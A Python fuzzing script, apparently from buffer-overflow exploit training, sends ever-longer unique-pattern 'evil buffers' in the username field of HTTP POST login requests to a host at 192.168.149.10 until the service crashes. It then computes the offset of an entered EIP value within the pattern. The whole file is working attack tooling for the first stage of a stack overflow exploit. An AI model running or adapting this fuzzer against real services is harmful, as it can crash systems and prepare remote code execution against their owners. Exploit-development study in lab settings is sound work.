#!/usr/bin/python3
import socket
import time
import sys
import string
import random
import binascii

buffer_history = ""

start_size = int(sys.argv[1])
end_size = int(sys.argv[2])


def randomString(stringLength=4):
    seq = string.ascii_letters + string.digits
    temp = ''.join(random.choice(seq) for i in range(stringLength))
    return temp.upper()

def init_buffer(size):
	global buffer_history
	while len(buffer_history) < start_size:	
		seq = randomString(4)
		temp = validate(seq)
		buffer_history += temp

def validate(seq):
	while seq in buffer_history:
		seq = randomString(4)
	return seq

def increment_buffer():
	global buffer_history
	seq = randomString(4)
	temp = validate(seq)
	buffer_history += temp	

init_buffer(start_size)
print("[*] Starting at {} bytes".format(start_size))
current_size = start_size

while(current_size < end_size):
	try:
		current_size = len(buffer_history)
		content = "username=" + buffer_history + "&password=A"
		
		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: 192.168.149.10\r\n"
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Referer: http://192.168.149.10/login\r\n"
		buffer += "Connection: close\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length: "+str(len(content))+"\r\n"
		buffer += "\r\n"
		buffer += content
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("192.168.149.10", 80))

		#print("Current Buffer:")
		#print(buffer_history)
		print("\n[*] Sending evil buffer...Size:", current_size)

		s.send(buffer.encode())
		s.close()
		time.sleep(5)
		increment_buffer()

		

	except:
		print("[-] Could not connect!")
		print(sys.exc_info())
		print("Current Buffer:")
		print(buffer_history)
		if input("[?] Find Hex Offest [y/n]? ").upper() == "Y":
			eip_hex = input("EIP Shows: ")
			eip_ascii = bytearray.fromhex(eip_hex).decode()
			offset = buffer_history.find(eip_ascii[::-1])
			if offset != -1:	
				print("[+] Offest -->",offset)
				sys.exit()
			else:
				print("[!] Pattern not found")
				sys.exit()
		else:
 			sys.exit()
	
